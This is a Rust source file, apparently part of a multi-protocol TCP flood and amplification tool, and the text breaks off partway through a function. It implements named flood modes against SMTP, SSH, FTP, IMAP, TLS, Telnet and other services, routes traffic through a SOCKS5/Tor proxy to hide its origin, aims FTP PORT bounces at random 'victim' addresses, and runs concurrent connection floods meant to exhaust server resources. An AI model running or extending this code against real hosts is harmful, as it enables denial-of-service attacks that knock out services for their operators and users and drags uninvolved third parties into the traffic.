use std::time::{Duration, Instant};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum TcpMode {
    SmtpVrfy,
    SmtpExpn,
    SmtpRcptTo,
    SmtpDataBomb,
    SshAuth,
    FtpBounce,
    FtpList,
    Finger,
    ImapLogin,
    Pop3Login,
    LdapSearch,
    MqttConnect,
    XmppStream,
    RtspDescribe,
    ModbusTcp,
    SocksConnect,
    SslReneg,
    TelnetNeg,
    GenericConnect,
    TcpConnectionFlood,
    RedisSlaveRead,
    DockerApi,
    KerberosAsReq,
    PostgresMd5Auth,
    CassandraThrift,
    ArdQuery,
    CupsIppTrigger,
    WebhookChain,
}

impl TcpMode {
    pub fn name(&self) -> &'static str {
        match self {
            TcpMode::SmtpVrfy => "SMTP VRFY flood",
            TcpMode::SmtpExpn => "SMTP EXPN flood",
            TcpMode::SmtpRcptTo => "SMTP RCPT TO flood",
            TcpMode::SmtpDataBomb => "SMTP DATA body bomb",
            TcpMode::SshAuth => "SSH auth flood",
            TcpMode::FtpBounce => "FTP PORT bounce",
            TcpMode::FtpList => "FTP LIST amplification",
            TcpMode::Finger => "Finger query flood",
            TcpMode::ImapLogin => "IMAP LOGIN flood",
            TcpMode::Pop3Login => "POP3 login flood",
            TcpMode::LdapSearch => "LDAP search flood",
            TcpMode::MqttConnect => "MQTT connect flood",
            TcpMode::XmppStream => "XMPP stream flood",
            TcpMode::RtspDescribe => "RTSP DESCRIBE flood",
            TcpMode::ModbusTcp => "Modbus TCP flood",
            TcpMode::SocksConnect => "SOCKS connect flood",
            TcpMode::SslReneg => "SSL renegotiation flood",
            TcpMode::TelnetNeg => "Telnet negotiation flood",
            TcpMode::GenericConnect => "TCP connect flood",
            TcpMode::TcpConnectionFlood => "Rapid connection flood",
            TcpMode::RedisSlaveRead => "Redis SLAVEOF/MIGRATE amplification",
            TcpMode::DockerApi => "Docker API info leak",
            TcpMode::KerberosAsReq => "Kerberos AS-REQ amplification",
            TcpMode::PostgresMd5Auth => "PostgreSQL MD5 auth amplification",
            TcpMode::CassandraThrift => "Cassandra Thrift amplification",
            TcpMode::ArdQuery => "Apple Remote Desktop query",
            TcpMode::CupsIppTrigger => "CUPS IPP trigger amplification",
            TcpMode::WebhookChain => "Webhook chain triggered amplification",
        }
    }

    pub fn default_port(&self) -> u16 {
        match self {
            TcpMode::SmtpVrfy | TcpMode::SmtpExpn | TcpMode::SmtpRcptTo => 25,
 TcpMode::SmtpDataBomb => 25,
            TcpMode::SshAuth => 22,
            TcpMode::FtpBounce | TcpMode::FtpList => 21,
            TcpMode::Finger => 79,
            TcpMode::ImapLogin => 143,
            TcpMode::Pop3Login => 110,
            TcpMode::LdapSearch => 389,
            TcpMode::MqttConnect => 1883,
            TcpMode::XmppStream => 5222,
            TcpMode::RtspDescribe => 554,
            TcpMode::ModbusTcp => 502,
            TcpMode::SocksConnect => 1080,
            TcpMode::SslReneg => 443,
            TcpMode::TelnetNeg => 23,
            TcpMode::GenericConnect => 80,
            TcpMode::TcpConnectionFlood => 0,
            TcpMode::RedisSlaveRead => 6379,
            TcpMode::DockerApi => 2375,
            TcpMode::KerberosAsReq => 88,
            TcpMode::PostgresMd5Auth => 5432,
            TcpMode::CassandraThrift => 9042,
            TcpMode::ArdQuery => 3283,
            TcpMode::CupsIppTrigger => 631,
            TcpMode::WebhookChain => 443,
        }
    }

    pub fn from_str(s: &str) -> Option<Self> {
        match s {
            "smtp-vrfy" | "smtp-vrfy-flood" | "email-verification" => Some(TcpMode::SmtpVrfy),
            "smtp-expn" | "smtp-expn-flood" => Some(TcpMode::SmtpExpn),
            "smtp-rcpt" | "smtp-rcpt-flood" => Some(TcpMode::SmtpRcptTo),
            "smtp-data" | "smtp-data-bomb" => Some(TcpMode::SmtpDataBomb),
            "ssh-auth" | "ssh-auth-flood" | "ssh-kexinit-flood" => Some(TcpMode::SshAuth),
            "ftp-bounce" | "ftp-port-bounce" => Some(TcpMode::FtpBounce),
            "ftp-list" | "ftp-listing-flood" => Some(TcpMode::FtpList),
            "finger" | "finger-query-flood" => Some(TcpMode::Finger),
            "imap-login" | "imap-login-flood" => Some(TcpMode::ImapLogin),
            "pop3-login" | "pop3" | "pop3-login-flood" => Some(TcpMode::Pop3Login),
            "ldap-search" | "ldap" | "ldap-search-flood" => Some(TcpMode::LdapSearch),
            "mqtt-connect" | "mqtt" | "mqtt-connect-flood" => Some(TcpMode::MqttConnect),
            "xmpp-stream" | "xmpp" | "xmpp-stream-flood" => Some(TcpMode::XmppStream),
            "rtsp-describe" | "rtsp" | "rtsp-describe-flood" => Some(TcpMode::RtspDescribe),
            "modbus-tcp" | "modbus" | "modbus-tcp-flood" => Some(TcpMode::ModbusTcp),
            "socks-connect" | "socks" | "socks5" | "socks-connect-flood" => Some(TcpMode::SocksConnect),
            "ssl-reneg" | "ssl-renegotiation" => Some(TcpMode::SslReneg),
            "telnet" | "telnet-neg" | "telnet-negotiation-flood" => Some(TcpMode::TelnetNeg),
            "tcp-connect" | "generic" => Some(TcpMode::GenericConnect),
            "tcp-connection-flood" | "connection-flood" | "tcp-conn-flood" => Some(TcpMode::TcpConnectionFlood),
            "redis-slave" | "redis-migrate" | "redis-slaveread" | "redis-slave-read" => Some(TcpMode::RedisSlaveRead),
            "docker-api" | "docker-info" => Some(TcpMode::DockerApi),
            "kerberos" | "kerberos-as-req" => Some(TcpMode::KerberosAsReq),
            "postgres" | "postgres-md5" | "postgresql-md5" | "postgres-md5-auth" => Some(TcpMode::PostgresMd5Auth),
            "cassandra" | "cassandra-thrift" => Some(TcpMode::CassandraThrift),
            "ard" | "ard-query" | "ardp" => Some(TcpMode::ArdQuery),
            "cups" | "cups-ipp" | "cups-ipp-trigger" => Some(TcpMode::CupsIppTrigger),
            "webhook" | "webhook-chain" | "webhook-chain-trigger" => Some(TcpMode::WebhookChain),
            _ => None,
        }
    }
}

/// SOCKS5 connect through proxy or direct
async fn connect(host: &str, port: u16, proxy: Option<&str>) -> Result<TcpStream, String> {
    tokio::time::timeout(Duration::from_secs(10), async {
        match proxy {
            Some(proxy_url) => {
                let proxy_str = proxy_url
                    .trim_start_matches("socks5h://")
                    .trim_start_matches("socks5://");
                let (proxy_host, proxy_port_str) = proxy_str.split_once(':').unwrap_or((proxy_str, "9050"));
                let proxy_port: u16 = proxy_port_str.parse().unwrap_or(9050);

                let mut stream = TcpStream::connect(format!("{}:{}", proxy_host, proxy_port))
                    .await
                    .map_err(|e| format!("proxy connect: {}", e))?;

                // SOCKS5 handshake
                // 1. greet
                stream.write_all(&[0x05, 0x01, 0x00])
                    .await
                    .map_err(|e| format!("socks5 greet: {}", e))?;
                let mut resp = [0u8; 2];
                stream.read_exact(&mut resp)
                    .await
                    .map_err(|e| format!("socks5 greet resp: {}", e))?;
                if resp[0] != 0x05 || resp[1] != 0x00 {
                    return Err(format!("SOCKS5 auth rejected: {:02x?}", resp));
                }

                // 2. connect request (domain name)
                let host_bytes = host.as_bytes();
                let mut req = Vec::with_capacity(7 + host_bytes.len());
                req.push(0x05);
                req.push(0x01);
                req.push(0x00);
                req.push(0x03);
                req.push(host_bytes.len() as u8);
                req.extend_from_slice(host_bytes);
                req.extend_from_slice(&port.to_be_bytes());

                stream.write_all(&req)
                    .await
                    .map_err(|e| format!("socks5 connect req: {}", e))?;

                let mut resp2 = [0u8; 4];
                stream.read_exact(&mut resp2)
                    .await
                    .map_err(|e| format!("socks5 connect resp: {}", e))?;
                if resp2[1] != 0x00 {
                    return Err(format!("SOCKS5 connect refused: code {}", resp2[1]));
                }

                // Read remaining address
                match resp2[3] {
                    0x01 => {
                        let mut addr = [0u8; 6];
                        stream.read_exact(&mut addr).await.map_err(|e| e.to_string())?;
                    }
                    0x03 => {
                        let mut len = [0u8; 1];
                        stream.read_exact(&mut len).await.map_err(|e| e.to_string())?;
                        let mut addr = vec![0u8; len[0] as usize + 2];
                        stream.read_exact(&mut addr).await.map_err(|e| e.to_string())?;
                    }
                    0x04 => {
                        let mut addr = [0u8; 18];
                        stream.read_exact(&mut addr).await.map_err(|e| e.to_string())?;
                    }
                    _ => {}
                }

                Ok(stream)
            }
            None => {
                TcpStream::connect(format!("{}:{}", host, port))
                    .await
                    .map_err(|e| format!("direct connect: {}", e))
            }
        }
    })
        .await
        .map_err(|_| "connect timeout".to_string())?
}

/// Result of a single protocol exchange: (bytes_sent, bytes_received, duration)
pub struct TcpResult {
    pub sent: usize,
    pub recv: usize,
    pub dur: Duration,
}

/// Run a single TCP amplification exchange. Returns sent/recv bytes.
async fn run_protocol(mode: TcpMode, host: &str, port: u16, proxy: Option<&str>) -> Result<TcpResult, String> {
    let start = Instant::now();
    let mut stream = connect(host, port, proxy).await?;

    // Use tokio::time::timeout for read/write timeouts instead of set_read_timeout
    let mut buf = vec![0u8; 8192];
    let result = tokio::time::timeout(Duration::from_secs(15), async {
        let (sent, recv) = match mode {
            TcpMode::SmtpVrfy => smtp_vrfy(&mut stream, &mut buf).await?,
            TcpMode::SmtpExpn => smtp_expn(&mut stream, &mut buf).await?,
            TcpMode::SmtpRcptTo => smtp_rcpt_to(&mut stream, &mut buf).await?,
            TcpMode::SmtpDataBomb => smtp_data_bomb(&mut stream, &mut buf).await?,
            TcpMode::SshAuth => ssh_auth(&mut stream, &mut buf).await?,
            TcpMode::FtpBounce => ftp_bounce(&mut stream, &mut buf).await?,
            TcpMode::FtpList => ftp_list(&mut stream, &mut buf).await?,
            TcpMode::Finger => finger_query(&mut stream, &mut buf).await?,
            TcpMode::ImapLogin => imap_login(&mut stream, &mut buf).await?,
            TcpMode::Pop3Login => pop3_login(&mut stream, &mut buf).await?,
            TcpMode::LdapSearch => ldap_search(&mut stream, &mut buf).await?,
            TcpMode::MqttConnect => mqtt_connect(&mut stream, &mut buf).await?,
            TcpMode::XmppStream => xmpp_stream(&mut stream, &mut buf).await?,
            TcpMode::RtspDescribe => rtsp_describe(&mut stream, &mut buf).await?,
            TcpMode::ModbusTcp => modbus_tcp(&mut stream, &mut buf).await?,
            TcpMode::SocksConnect => socks_connect(&mut stream, &mut buf).await?,
            TcpMode::SslReneg => ssl_reneg(&mut stream, &mut buf).await?,
            TcpMode::TelnetNeg => telnet_neg(&mut stream, &mut buf).await?,
            TcpMode::GenericConnect => generic_connect(&mut stream, &mut buf).await?,
            TcpMode::TcpConnectionFlood => connection_flood(&mut stream, &mut buf).await?,
            TcpMode::RedisSlaveRead => redis_slave_read(&mut stream, &mut buf).await?,
            TcpMode::DockerApi => docker_api(&mut stream, &mut buf).await?,
            TcpMode::KerberosAsReq => kerberos_as_req(&mut stream, &mut buf).await?,
            TcpMode::PostgresMd5Auth => postgres_md5(&mut stream, &mut buf).await?,
            TcpMode::CassandraThrift => cassandra_thrift(&mut stream, &mut buf).await?,
            TcpMode::ArdQuery => ard_query(&mut stream, &mut buf).await?,
            TcpMode::CupsIppTrigger => cups_ipp_trigger(&mut stream, &mut buf).await?,
            TcpMode::WebhookChain => webhook_chain(&mut stream, &mut buf).await?,
        };
        Ok::<(usize, usize), String>((sent, recv))
    }).await;

    match result {
        Ok(Ok((sent, recv))) => Ok(TcpResult { sent, recv, dur: start.elapsed() }),
        Ok(Err(e)) => Err(e),
        Err(_) => Err("timeout".to_string()),
    }
}

// ================================================================
// SMTP VRFY - sends VRFY command, server looks up address
// Request: ~30B, Response: ~200-500B (user info)
// ================================================================
async fn smtp_vrfy(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // Read banner
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // EHLO
    stream.write_all(b"EHLO test\r\n").await.map_err(|e| e.to_string())?;
    sent += 12;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // VRFY with random local part
    let user = format!("user{}", rand::random::<u16>());
    let cmd = format!("VRFY {}\r\n", user);
    stream.write_all(cmd.as_bytes()).await.map_err(|e| e.to_string())?;
    sent += cmd.len();
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // QUIT
    stream.write_all(b"QUIT\r\n").await.ok();
    sent += 6;

    Ok((sent, recv))
}

// ================================================================
// SMTP EXPN - expands mailing list, server returns members
// ================================================================
async fn smtp_expn(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"EHLO test\r\n").await.map_err(|e| e.to_string())?;
    sent += 12;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"EXPN postmaster\r\n").await.map_err(|e| e.to_string())?;
    sent += 18;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"QUIT\r\n").await.ok();
    sent += 6;

    Ok((sent, recv))
}

// ================================================================
// SMTP RCPT TO - flood with invalid recipients
// ================================================================
async fn smtp_rcpt_to(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"EHLO test\r\n").await.map_err(|e| e.to_string())?;
    sent += 12;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"MAIL FROM:<>\r\n").await.map_err(|e| e.to_string())?;
    sent += 15;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // Send multiple RCPT TOs
    for _ in 0..5 {
        let rcpt = format!("RCPT TO:<user{}@test.com>\r\n", rand::random::<u16>());
        stream.write_all(rcpt.as_bytes()).await.map_err(|e| e.to_string())?;
        sent += rcpt.len();
        let n = stream.read(buf).await.map_err(|e| e.to_string())?;
        recv += n;
    }

    stream.write_all(b"QUIT\r\n").await.ok();
    sent += 6;

    Ok((sent, recv))
}

// ================================================================
// SSH Auth - opens SSH connection, server does crypto work
// ================================================================
async fn ssh_auth(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // Read SSH banner
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // Send our banner
    stream.write_all(b"SSH-2.0-OpenSSH_8.9p1\r\n")
        .await
        .map_err(|e| e.to_string())?;
    sent += 21;

    // Read KEX init
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // Send KEX init (minimal)
    let kex_packet = build_ssh_kexinit();
    stream.write_all(&kex_packet).await.map_err(|e| e.to_string())?;
    sent += kex_packet.len();

    // Read response (this triggers DH key exchange - expensive for server)
    // Just read what we can in a short time
    let timeout = tokio::time::sleep(Duration::from_secs(2));
    tokio::select! {
        n = stream.read(buf) => {
            if let Ok(n) = n { recv += n; }
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

fn build_ssh_kexinit() -> Vec<u8> {
    // SSH_MSG_KEXINIT packet (RFC 4253)
    let payload: Vec<u8> = vec![
        20, // SSH_MSG_KEXINIT
        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, // cookie (16 bytes random)
        // name-list: key exchange algorithms
        0, 0, 0, 38, // length
        b'd', b'i', b'f', b'f', b'i', b'e', b'-', b'h', b'e', b'l', b'l', b'm', b'a', b'n', b'-',
        b'g', b'r', b'o', b'u', b'p', b'-', b'e', b'x', b'c', b'h', b'a', b'n', b'g', b'e', b'-',
        b's', b'h', b'a', b'2', b'5', b'6', b',', b'c', b'u', b'r', b'v', b'e', b'2', b'5', b'5', b'1', b'9', b'-',
        b's', b'h', b'a', b'2', b'5', b'6', b',',
        b'e', b'c', b'd', b'h', b'-', b's', b'h', b'a', b'2', b'-', b'n', b'i', b's', b't', b'p', b'2', b'5', b'6',
        // host key algorithms
        0, 0, 0, 0,
        // encryption algorithms c2s
        0, 0, 0, 27,
        b'a', b'e', b's', b'2', b'5', b'6', b'-', b'c', b't', b'r', b',',
        b'a', b'e', b's', b'1', b'9', b'2', b'-', b'c', b't', b'r', b',',
        b'a', b'e', b's', b'1', b'2', b'8', b'-', b'c', b't', b'r',
        // encryption algorithms s2c
        0, 0, 0, 27,
        b'a', b'e', b's', b'2', b'5', b'6', b'-', b'c', b't', b'r', b',',
        b'a', b'e', b's', b'1', b'9', b'2', b'-', b'c', b't', b'r', b',',
        b'a', b'e', b's', b'1', b'2', b'8', b'-', b'c', b't', b'r',
        // mac algorithms c2s
        0, 0, 0, 22,
        b'h', b'm', b'a', b'c', b'-', b's', b'h', b'a', b'2', b'-', b'2', b'5', b'6', b',',
        b'h', b'm', b'a', b'c', b'-', b's', b'h', b'a', b'1',
        // mac algorithms s2c
        0, 0, 0, 22,
        b'h', b'm', b'a', b'c', b'-', b's', b'h', b'a', b'2', b'-', b'2', b'5', b'6', b',',
        b'h', b'm', b'a', b'c', b'-', b's', b'h', b'a', b'1',
        // compression c2s
        0, 0, 0, 7, b'n', b'o', b'n', b'e', b',',
        // compression s2c
        0, 0, 0, 7, b'n', b'o', b'n', b'e', b',',
        // languages c2s
        0, 0, 0, 0,
        // languages s2c
        0, 0, 0, 0,
        // first_kex_packet_follows
        0,
        // reserved (uint32)
        0, 0, 0, 0,
    ];

    // Packet length (4 bytes) + padding length (1) + payload + padding
    let padding = 8;
    let total_len = 1 + payload.len() + padding;
    let mut packet = Vec::with_capacity(4 + total_len);
    packet.extend_from_slice(&(total_len as u32).to_be_bytes());
    packet.push(padding as u8);
    packet.extend_from_slice(&payload);
    packet.extend(vec![0u8; padding]);
    packet
}

// ================================================================
// FTP PORT bounce + LIST - sends PORT with victim IP, then LIST
// ================================================================
async fn ftp_bounce(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"USER anonymous\r\n").await.map_err(|e| e.to_string())?;
    sent += 16;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"PASS test@\r\n").await.map_err(|e| e.to_string())?;
    sent += 12;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // PORT with random victim IP (the amplification happens server->victim)
    let a = rand::random::<u8>();
    let b = rand::random::<u8>();
    let c = rand::random::<u8>();
    let d = rand::random::<u8>();
    let p1 = rand::random::<u8>();
    let p2 = rand::random::<u8>();
    let port_cmd = format!("PORT {},{},{},{},{},{}\r\n", a, b, c, d, p1, p2);
    stream.write_all(port_cmd.as_bytes()).await.map_err(|e| e.to_string())?;
    sent += port_cmd.len();
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // LIST
    stream.write_all(b"LIST\r\n").await.map_err(|e| e.to_string())?;
    sent += 6;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"QUIT\r\n").await.ok();
    sent += 6;

    Ok((sent, recv))
}

async fn ftp_list(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"USER anonymous\r\n").await.map_err(|e| e.to_string())?;
    sent += 16;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"PASS test@\r\n").await.map_err(|e| e.to_string())?;
    sent += 12;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // PASV + LIST (standard FTP data channel opening)
    stream.write_all(b"PASV\r\n").await.map_err(|e| e.to_string())?;
    sent += 6;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"LIST\r\n").await.map_err(|e| e.to_string())?;
    sent += 6;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"QUIT\r\n").await.ok();
    sent += 6;

    Ok((sent, recv))
}

// ================================================================
// Finger query /79 — user query, returns full user info
// Request: ~20B, Response: ~500-2000B (gecos, office, phone)
// ================================================================
async fn finger_query(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    let query = b"root\r\n";
    stream.write_all(query).await.map_err(|e| e.to_string())?;
    sent += query.len();

    let timeout = tokio::time::sleep(Duration::from_secs(3));
    tokio::select! {
        n = stream.read(buf) => {
            recv += n.map_err(|e| e.to_string())?;
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

// ================================================================
// IMAP LOGIN flood /143 — sends LOGIN, server auths
// ================================================================
async fn imap_login(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"a001 LOGIN testuser testpass\r\n")
        .await
        .map_err(|e| e.to_string())?;
    sent += 29;

    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    Ok((sent, recv))
}

// ================================================================
// SSL/TLS renegotiation /443 — triggers server-side crypto
// Note: This sends a ClientHello, server does asymmetric crypto work
// ================================================================
async fn ssl_reneg(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // TLS 1.2 ClientHello (minimal)
    let client_hello = build_tls_clienthello();
    stream.write_all(&client_hello).await.map_err(|e| e.to_string())?;
    sent += client_hello.len();

    let timeout = tokio::time::sleep(Duration::from_secs(3));
    tokio::select! {
        n = stream.read(buf) => {
            recv += n.unwrap_or(0);
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

fn build_tls_clienthello() -> Vec<u8> {
    // TLS record: ClientHello v1.2
    // ContentType: 0x16 (Handshake)
    // Version: 0x0301 (TLS 1.0)
    let mut record = Vec::new();
    record.push(0x16); // Handshake
    record.extend_from_slice(&[0x03, 0x01]); // TLS version
    // Length placeholder - will be filled at the end
    record.extend_from_slice(&[0x00, 0x00]);

    // Handshake: ClientHello
    record.push(0x01); // ClientHello
    // Length placeholder
    record.extend_from_slice(&[0x00, 0x00, 0x00]);

    // Protocol version
    record.extend_from_slice(&[0x03, 0x03]); // TLS 1.2

    // Random (32 bytes)
    for _ in 0..32 {
        record.push(rand::random::<u8>());
    }

    // Session ID (empty)
    record.push(0x00);

    // Cipher suites
    let ciphers: &[u16] = &[
        0xC02B, // TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256
        0xC02F, // TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
        0x009C, // TLS_RSA_WITH_AES_128_GCM_SHA256
        0x003C, // TLS_RSA_WITH_AES_128_CBC_SHA
    ];
    record.push(((ciphers.len() * 2) >> 8) as u8);
    record.push(((ciphers.len() * 2) & 0xFF) as u8);
    for c in ciphers {
        record.extend_from_slice(&c.to_be_bytes());
    }

    // Compression methods (1 null)
    record.push(0x01);
    record.push(0x00);

    // Extensions length
    record.extend_from_slice(&[0x00, 0x00]);

    // Fill in lengths
    let handshake_len = record.len() - 5; // from record type to end
    let record_len = record.len() - 5; // from version to end

    record[3] = (record_len >> 8) as u8;
    record[4] = (record_len & 0xFF) as u8;
    record[6] = ((handshake_len - 4) >> 16) as u8;
    record[7] = ((handshake_len - 4) >> 8) as u8;
    record[8] = ((handshake_len - 4) & 0xFF) as u8;

    record
}

// ================================================================
// Telnet negotiation — sends WILL/WONT/DONT/DO to trigger negotiation
// ================================================================
async fn telnet_neg(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    // IAC DO TIMING-MARK (triggers response)
    // IAC WILL SUPPRESS-GO-AHEAD
    // IAC DO TERMINAL-TYPE
    let neg = &[
        0xFF, 0xFD, 0x06, // IAC DO TIMING-MARK
        0xFF, 0xFB, 0x03, // IAC WILL SUPPRESS-GO-AHEAD
        0xFF, 0xFD, 0x18, // IAC DO TERMINAL-TYPE
        0xFF, 0xFB, 0x1F, // IAC WILL NAWS
        0xFF, 0xFD, 0x20, // IAC DO TERMINAL-SPEED
    ];

    stream.write_all(neg).await.map_err(|e| e.to_string())?;
    sent += neg.len();

    let timeout = tokio::time::sleep(Duration::from_secs(2));
    tokio::select! {
        n = stream.read(buf) => {
            recv += n.unwrap_or(0);
        }
        _ = timeout => {}
    }

    Ok((sent, recv))
}

// ================================================================
// Generic TCP connect — just opens and closes
// ================================================================
async fn generic_connect(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut recv = 0;

    // Just read whatever the server sends (banner, etc.)
    let timeout = tokio::time::sleep(Duration::from_secs(1));
    tokio::select! {
        n = stream.read(buf) => {
            recv += n.unwrap_or(0);
        }
        _ = timeout => {}
    }

    Ok((0, recv))
}

async fn connection_flood(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    // Rapid connect + minimal data exchange, then disconnect
    // The goal is to exhaust server connection pools and port queues
    match tokio::time::timeout(Duration::from_secs(2), stream.write_all(b"GET / HTTP/1.0\r\n\r\n")).await {
        Ok(Ok(_)) => {
            match tokio::time::timeout(Duration::from_millis(500), stream.read(buf)).await {
                Ok(Ok(n)) => Ok((0, n)),
                _ => Ok((0, 0)),
            }
        }
        _ => Ok((0, 0)),
    }
}

/// Run TCP load: spawns workers that repeatedly connect and send protocol data
pub async fn run_tcp_load(
    mode: TcpMode,
    target: &str,
    proxy: Option<String>,
    concurrency: usize,
    duration_secs: u64,
    rate_limit: Option<u64>,
) {
    let start = Instant::now();
    let dur = Duration::from_secs(duration_secs);
    let mut rate_limiter = crate::types::RateLimiter::new(rate_limit);
    if let Some(rate) = rate_limit {
        println!("Rate limit: {} pkt/s", rate);
    }
    let port = mode.default_port();
    let host = target.split(':').next().unwrap_or(target);
    let custom_port = target.split(':').nth(1).and_then(|p| p.parse::<u16>().ok());

    let port = custom_port.unwrap_or(port);

    println!("=== TCP Amplification: {} ===", mode.name());
    println!("Target: {}:{} | Concurrency: {} | Duration: {}s", host, port, concurrency, duration_secs);
    if let Some(p) = &proxy {
        println!("Proxy: {}", p);
    }
    println!();

    let mut total_sent: u64 = 0;
    let mut total_recv: u64 = 0;
    let mut total_requests: u64 = 0;
    let mut total_errors: u64 = 0;

    while start.elapsed() < dur {
        rate_limiter.pace().await;
        let mut handles = Vec::new();
        let batch_start = Instant::now();

        for _ in 0..concurrency {
            let host = host.to_string();
            let proxy = proxy.clone();

            handles.push(tokio::spawn(async move {
                match run_protocol(mode, &host, port, proxy.as_deref()).await {
                    Ok(result) => {
                        (result.sent as u64, result.recv as u64, result.dur, false)
                    }
                    Err(_e) => {
                        (0u64, 0u64, Duration::ZERO, true)
                    }
                }
            }));
        }

        for h in handles {
            match h.await {
                Ok((sent, recv, _dur, is_err)) => {
                    total_sent += sent;
                    total_recv += recv;
                    total_requests += 1;
                    if is_err { total_errors += 1; }
                }
                Err(_) => {
                    total_errors += 1;
                    total_requests += 1;
                }
            }
        }

        let elapsed = start.elapsed().as_secs();
        let _batch_elapsed = batch_start.elapsed().as_secs_f64();

        // Status update
        if elapsed.is_multiple_of(5) || total_requests < 10 {
            let amp_ratio = if total_sent > 0 {
                total_recv as f64 / total_sent as f64
            } else {
                0.0
            };
            println!(
                "[{:3}s] Req: {:5} | Err: {:3} | Sent: {}KB | Recv: {}KB | Ratio: {:.1}x | Rate: {:.0} req/s",
                elapsed,
                total_requests,
                total_errors,
                total_sent / 1024,
                total_recv / 1024,
                amp_ratio,
                total_requests as f64 / elapsed.max(1) as f64,
            );
        }
    }

    let elapsed = start.elapsed().as_secs().max(1);
    let amp_ratio = if total_sent > 0 {
        total_recv as f64 / total_sent as f64
    } else {
        0.0
    };
    println!();
    println!("=== Results ===");
    println!("Total requests: {}", total_requests);
    println!("Total errors:   {}", total_errors);
    println!("Sent:           {} bytes ({} KB)", total_sent, total_sent / 1024);
    println!("Received:       {} bytes ({} KB)", total_recv, total_recv / 1024);
    println!("Amplification:  {:.1}x", amp_ratio);
    println!("Rate:           {:.0} req/s", total_requests as f64 / elapsed as f64);
}

// ================================================================
// SMTP DATA BOMB — sends HELO/MAIL/RCPT/DATA with large body
// Request: ~320B (HELO+MAIL+RCPT+DATA), Response: per-recipient processing
// ================================================================
async fn smtp_data_bomb(stream: &mut TcpStream, buf: &mut [u8]) -> Result<(usize, usize), String> {
    let mut sent = 0;
    let mut recv = 0;

    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"EHLO test\r\n").await.map_err(|e| e.to_string())?;
    sent += 11;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"MAIL FROM:<test@test.com>\r\n").await.map_err(|e| e.to_string())?;
    sent += 28;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    stream.write_all(b"RCPT TO:<user@test.com>\r\n").await.map_err(|e| e.to_string())?;
    sent += 26;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    // DATA with 1KB body — server processes/queues the full message
    stream.write_all(b"DATA\r\n").await.map_err(|e| e.to_string())?;
    sent += 6;
    let n = stream.read(buf).await.map_err(|e| e.to_string())?;
    recv += n;

    let body = format!("Subject: test\r\n\r\n{}\r\n.\r\n", "A".repeat(1024));
    stream.write_all(body.as_bytes()).await.map_err(|e| e.to_string())?;
    sent += body.len();

    let timeout = tokio::time::sleep(Duration::from_secs(2));
    tokio::select! {
        n = stream.read(buf) => {
            recv += n.unwrap_or(0);
        }
        _ = timeout => {}
    }

